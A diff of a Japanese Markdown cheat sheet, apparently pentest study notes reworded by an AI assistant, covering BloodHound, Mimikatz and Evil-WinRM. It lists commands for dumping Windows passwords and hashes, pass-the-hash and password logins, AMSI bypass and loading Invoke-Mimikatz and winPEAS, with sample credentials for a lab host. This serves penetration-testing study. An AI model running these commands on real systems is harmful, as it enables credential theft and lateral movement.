@@ -1,96 +1,158 @@
+以下に、`BloodHound`、`Mimikatz`、`Evil-WinRM`に関する内容をMarkdown形式で目次付きでまとめました。
+
+```markdown
+# 目次
+1. [BloodHound](#bloodhound)
+2. [Mimikatz](#mimikatz)
+3. [Evil-WinRM](#evil-winrm)
+
+---
+
 ## BloodHound
-BloodHound ( https://github.com/BloodHoundAD/BloodHound) とは、グラフ理論にもとづき、Active Directory環境の意図せぬ関係性を明らかにするためのツールです。
-これにより、低特権ユーザーをDomain Adminsへ権限昇格するなど、他のユーザーやグループへ移行するためのパスを発見することができます。
-https://qiita.com/v_avenger/items/56ef4ae521af6579c058
-ターゲットAD上でSharphound.exeを実行する
-作成された日付入りのzipファイルをkali上に転送する
-neo4jの起動
 
+BloodHound ([GitHubリンク](https://github.com/BloodHoundAD/BloodHound)) は、グラフ理論に基づきActive Directory環境の意図しない関係性を明らかにするためのツールです。これにより、低特権ユーザーをDomain Adminsに昇格させるためのパスを発見することができます。詳細については、[Qiita記事](https://qiita.com/v_avenger/items/56ef4ae521af6579c058)をご覧ください。
 
-②BloodHoundの起動
+### 操作手順
 
+1. **ターゲットAD上でSharpHound.exeを実行する**
+   - SharpHoundは、Active Directoryの情報を収集し、関係性を解析するツールです。
+   
+2. **作成された日付入りのzipファイルをKali上に転送する**
+   - ファイルを転送するには、`scp`や`ftp`などのツールを使用します。
 
-転送したファイルをアップロードする
+3. **neo4jの起動**
+   - BloodHoundはNeo4jデータベースを使用してグラフデータを管理します。
+
+4. **BloodHoundの起動**
+   - Neo4jが起動したら、BloodHoundを実行し、収集したデータをアップロードします。
 
 ---
 
 ## Mimikatz
-privilege::debug
-sekurlsa::logonpasswords 
-#hashes and plaintext passwords
-lsadump::sam
-lsadump::lsa /patch #both these dump SAM
 
-#OneLiner
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"  
-![image](https://github.com/user-attachments/assets/80751d7c-e8fe-4d86-a690-98426942fdff)
+Mimikatzは、Windowsシステムのパスワードやハッシュをダンプするためのツールです。
+
+### 基本コマンド
+
+- **パスワードとハッシュのダンプ**
+
+  ```bash
+  privilege::debug
+  sekurlsa::logonpasswords
+  ```
+
+- **SAMとLSAのダンプ**
+
+  ```bash
+  lsadump::sam
+  lsadump::lsa /patch
+  ```
+
+- **ワンライナーでの実行**
+
+  ```bash
+  .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+  ```
+
+  ![Mimikatz Example](https://github.com/user-attachments/assets/80751d7c-e8fe-4d86-a690-98426942fdff)
+
 ---
 
-## Evil-Winrm
-WinRMとは
-「Windows Remote Management (WinRM)」とは、MicrosoftによるWS-Management Protocolの実装です。これにより、さまざまなベンダーのハードウェアとオペレーティングシステムの相互運用を可能にし、システム管理者の負担を軽減することを目指しています。
-一方で、被害者のマシンで、WinRMサービスが有効になっている場合、環境内における「Lateral Movement（横展開)」に利用可能な方法の一つになります。
-MITER ATT＆CKが示す「ATT&CK Matrix for Enterprise」では、「TA0008: Lateral Movement」戦術（Tactic）における戦法（Technique）の一つとして「T1028: Windows Remote Management」を分類しています。
-また、「CAPEC（Common Attack Pattern Enumeration and Classification：共通攻撃パターン一覧）」では、「CAPEC-555：盗まれた資格情報を使用したリモートサービス」として分類しています。
-要素名	概要	ID
-Technique	攻撃に使われる技術（戦法）	T1028
-Tactics	戦術：使われた技術によって達成する（目指す）ゴール	TA0008
-		
-		
-		
-		Evil-WinRM
-Evil-WinRMツールは、WinRMサービスが有効（通常は5985/tcpで応答）かつ、資格情報とアクセス許可がある場合に使用することのできるリモートシェルプログラムです。
-Evil-WinRMツールを介することで、リモートのWindowsサーバーで稼働しているWinRMサービスに接続することができ、インタラクティブなPowerShellを取得することができます。
+## Evil-WinRM
 
-##winrm service discovery
-nmap -p5985,5986 <IP>
-5985 - plaintext protocol
-5986 - encrypted
+WinRM（Windows Remote Management）は、MicrosoftのWS-Management Protocolの実装です。リモートシェルプログラムとしてEvil-WinRMを使用することで、WinRMサービスが有効なリモートWindowsサーバーに接続できます。
 
-##Login with password
-evil-winrm -i <IP> -u user -p pass
-evil-winrm -i <IP> -u user -p pass -S 
-#if 5986 port is open
+### WinRMサービスの発見
 
-##Login with Hash
-evil-winrm -i <IP> -u user -H ntlmhash
+- **ポート5985（平文プロトコル）および5986（暗号化されたプロトコル）のスキャン**
 
-##Login with key
-evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S 
-#-c for public key and -k for private key
+  ```bash
+  nmap -p5985,5986 <IP>
+  ```
 
-##Logs
-evil-winrm -i <IP> -u user -p pass -l
+### ログイン方法
 
-##File upload and download
-upload <file>
-download <file> <filepath-kali> 
-#not required to provide path all time
+- **パスワードでログイン**
 
-##Loading files direclty from Kali location
-evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell 
-#場所は異なる場合があります
-Bypass-4MSI
-Invoke-Mimikatz.ps1
-Invoke-Mimikatz
+  ```bash
+  evil-winrm -i <IP> -u user -p pass
+  evil-winrm -i <IP> -u user -p pass -S
+  ```
 
-##evil-winrm commands
-menu 
-# to view commands
-#実行するコマンドはいくつかあります
-#これは、バイナリを実行する例です
-evil-winrm -i <IP> -u user -p pass -e /opt/privsc
-Bypass-4MSI
-menu
-Invoke-Binary /opt/privsc/winPEASx64.exe![image](https://github.com/user-attachments/assets/3f9ef784-7508-431b-9423-8619fc59e637)
+- **ハッシュでログイン**
 
+  ```bash
+  evil-winrm -i <IP> -u user -H ntlmhash
+  ```
 
-パスワードログイン
-evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
-![image](https://github.com/user-attachments/assets/7020f363-a6ca-46b9-9f53-37b00809c45a)
+- **キーでログイン**
 
-ハッシュ値によるログイン
-evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
-![image](https://github.com/user-attachments/assets/422c7f6c-7d6a-47ae-a374-947c13d39b0b)
+  ```bash
+  evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
+  ```
 
-![image](https://github.com/user-attachments/assets/764171ae-cf49-4710-95a5-508452d37fe3)
+### ログの表示
+
+- **ログ表示**
+
+  ```bash
+  evil-winrm -i <IP> -u user -p pass -l
+  ```
+
+### ファイルのアップロードとダウンロード
+
+- **ファイルのアップロード**
+
+  ```bash
+  upload <file>
+  ```
+
+- **ファイルのダウンロード**
+
+  ```bash
+  download <file> <filepath-kali>
+  ```
+
+- **Kaliから直接ファイルを読み込む**
+
+  ```bash
+  evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell
+  ```
+
+### Evil-WinRMコマンド
+
+- **コマンドメニューの表示**
+
+  ```bash
+  menu
+  ```
+
+- **バイナリの実行**
+
+  ```bash
+  evil-winrm -i <IP> -u user -p pass -e /opt/privsc
+  Invoke-Binary /opt/privsc/winPEASx64.exe
+  ```
+
+  ![Evil-WinRM Example](https://github.com/user-attachments/assets/3f9ef784-7508-431b-9423-8619fc59e637)
+
+- **パスワードログイン例**
+
+  ```bash
+  evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
+  ```
+
+  ![Password Login](https://github.com/user-attachments/assets/7020f363-a6ca-46b9-9f53-37b00809c45a)
+
+- **ハッシュ値によるログイン例**
+
+  ```bash
+  evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
+  ```
+
+  ![Hash Login](https://github.com/user-attachments/assets/422c7f6c-7d6a-47ae-a374-947c13d39b0b)
+
+  ![Example](https://github.com/user-attachments/assets/764171ae-cf49-4710-95a5-508452d37fe3)
+```
+
+このMarkdown形式のドキュメントで、各ツールの使い方とコマンド例が体系的に整理されています。必要に応じて、具体的なコマンドや操作方法を追加するとさらに役立つでしょう。
